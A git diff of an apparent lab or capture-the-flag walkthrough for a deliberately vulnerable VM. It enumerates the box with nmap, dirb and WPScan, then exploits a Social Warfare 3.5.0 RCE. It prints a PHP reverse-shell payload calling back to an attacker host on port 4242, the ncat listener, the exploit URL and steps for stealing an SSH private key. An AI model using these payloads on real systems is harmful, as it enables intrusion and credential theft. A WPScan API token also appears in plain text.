@@ -19,7 +19,7 @@ Objectives:
   
 1. Use nmap to scan the network
 
-    We'll use an intense scan on the network as it's quite small (virtualbox host only), we can see web and ssh services running, but no aparent vulnerabilities yet.
+    We'll use an intense scan on the victim vm (192.168.56.111), we can see web and ssh services running, but no aparent vulnerabilities yet.
 
     ![victim machine nmap scan result](img/1-nmap.png)
    
@@ -41,7 +41,6 @@ Objectives:
 
    Attempting to login with ssh shows it only accepts key authentication, thus ruling out ssh brute force with common passwords, if we want a way in we'll need an alternative
 
-  ![attempt at logging into the machine with ssh](img/4-sshatt.png)
 
 <br>
 
@@ -51,28 +50,73 @@ Objectives:
   
     ![dirb website results](img/5-dirb.png)
 
+<br>
+
 5. Use WPScan
 
-   As we saw on the las step wordpress is installed, WPScan will show, the wordpress, plugins and themes versions, as well as vulnerabilities associated with them
+   As we saw on the las step wordpress is installed, WPScan will show wordpress, plugins and themes versions, as well as vulnerabilities associated with them, for this we'll need an api key that we can get by creating a free account.
+
+   And we'll run the command
+
+   `sudo wpscan --api-token <API> --url http://192.168.56.111/wordpress/ -e`
+   
+   ![wpscan result](img/)
+
+   After the scan we can see that Social Warfare is installed and on version 3.5.0 there is a vulnerability that wpscan recommends, we can also see users "max" and "admin".
 
 <br>
 
----
+6. Prepare the exploit
 
----
+   We can see that Social Warfare 3.5.0 has a RCE [vulnerability](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/). To exploit it we'll need a web server and a payload and a netcat listener to get a reverse shell.
 
+    - Web server
+
+       We need a web server to serve our payload, this will be apache as it comes pre-installed on kali, we only need to enable it:
+
+       ![enable apache](img/)
+
+
+    - Netcat
  
+       We need a netcat instance to listen to our reverse shell and catch it, this will use openssl and you can find more info on the [swisskeyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl) repository by [Swissky](https://github.com/swisskyrepo).
+   
+       The command to execute will be `ncat --ssl -vv -l -p 4242`.
+       This will listen for any connection on port 4242.
+      
+       ![running netcat listener](img/)
+ 
+    - Payload
+      
+       The payload also comes from the same repo and it will be placed on the file `/var/www/html/payload.txt` and contain the next code:
+      
+        ```<pre>system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')</pre>```
+
+       The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.
+
+<br>
+
+7. Using the exploit
+
+   To run the exploit we need to visit the next url on a web browser:
+
+   `VICTIM_MACHINE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACK_MACHINE/exploit.txt`
+
+   The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and "VICTIM_MACHINE to our so simple:1 vm, in my case 192.168.56.111
+
+   ![Exploit on web browser result](img/)
+   
+<br>
+
+8. Get a user ssh key
 
 
+---
 
-5- create a wpscan account and get api key
+---
 
-6- run "sudo wpscan --api-token BxwwzQ5nrvb34sz235LeWNQQplA4vqr7VBu9WEylbrQ --url http://192.168.56.111/wordpress/ -e" to get information of the wordpress sitem, we know that Social Warfare is installed and on version 3.5.0 is installed and the users "admin" and "max" are created.
+# Ignore
 
-7- search for vulnerabilities of social warfare and we find a remote execution vulnerability: "https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/".
-
-8- spin up an apache install, it will contain our payload called "payload.txt" and contain "<pre>system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')</pre>", this will create a connection to our attacker machine on port 4242. (reverse shell command from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl)
-9- Start nc with the next options "ncat --ssl -vv -l -p 4242", we will get a reverse shell connection
 10- navigate to the max user .ssh folder and get the id_rsa key, we will copy the contents and create a file on our attack machine, we'll call it "key", paste the private key into it, and chmod 600 said file.
 11- add the private key with "ssh-add key"
 12- ssh into the machine as max with "ssh max@192.168.56.111"
